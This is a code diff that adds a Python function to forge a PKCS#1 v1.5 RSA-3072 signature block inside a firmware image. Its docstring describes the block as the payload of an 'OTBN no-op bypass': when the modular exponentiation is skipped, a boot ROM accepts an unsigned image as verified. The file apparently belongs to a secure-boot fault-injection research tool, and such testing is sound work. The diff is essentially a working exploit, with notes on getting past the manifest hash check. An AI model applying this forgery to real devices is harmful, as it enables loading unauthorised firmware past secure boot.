@@ -1048,6 +1048,56 @@ def flip_signature_byte(
     return byte_index
 
 
+def forge_pkcs1_signature(buf: bytearray, slot: str) -> bytes:
+    """Replace the signature with the literal PKCS#1 v1.5 block the ROM expects.
+
+    This is the payload of the OTBN no-op bypass. ``verify_pkcs1_v15()`` compares
+    the modexp RESULT against this structure, and the result shares its DMEM
+    buffer with the signature (both at ``inout``), so a modexp that never runs
+    leaves exactly these bytes for the comparison to succeed against -- an
+    unverified boot reported as a verified one.
+
+    Nothing secret is used to build it: the structure is public and the digest is
+    the manifest's own. That is the point. A device whose verifier actually runs
+    rejects this signature, because ``sig^e mod n`` of a block nobody signed is
+    not that block.
+
+    No rehash: the signature sits outside the signed region, so the manifest hash
+    still matches and the run reaches signature verification rather than being
+    refused earlier.
+
+    Returns the block written, so a caller can show what it planted.
+    """
+    require_classic(buf, slot)
+    base = slot_base(slot)
+    # The field is 512 B but the primitive is 384; the ROM converts exactly
+    # OCA_RSA3072_SIGNATURE_BYTES from the start of it (rsa_verify.c,
+    # bytes_to_otbn_words). A block built to the field width would put the
+    # DigestInfo and digest past what the ROM ever reads, so the forgery has to
+    # be the primitive's width and the tail of the field is left alone.
+    sig_len = signature_size(buf, slot)
+    if sig_len != 384:
+        raise ValueError(f"signature_size is {sig_len}, expected 384 for RSA-3072")
+    field = manifest_hash_field(buf, base)
+    digest = bytes(field[:32])
+    if any(field[32:]):
+        raise ValueError(
+            f"manifest_hash field is {len(field)} B with non-zero bytes past 32; "
+            f"this helper assumes SHA-256 in the low 32 and zero padding after"
+        )
+    # DigestInfo for SHA-256, RFC 8017 A.2.4. The ROM holds the same 19 bytes as
+    # packed words in rsa_verify.c.
+    digest_info = bytes.fromhex("3031300d060960864801650304020105000420")
+    pad_len = sig_len - 3 - len(digest_info) - len(digest)
+    if pad_len < 8:
+        raise ValueError(f"signature is {sig_len} B, too small for a PKCS#1 block")
+    block = b"\x00\x01" + b"\xff" * pad_len + b"\x00" + digest_info + digest
+    if len(block) != sig_len:
+        raise ValueError(f"built a {len(block)} B block for a {sig_len} B signature")
+    buf[base + OFF_SIGNATURE : base + OFF_SIGNATURE + sig_len] = block
+    return block
+
+
 def _selftest() -> int:
     """Check the layout assumptions against every packed image on disk."""
     build = _SEP_ROOT / "bootrom" / "prod" / "build"
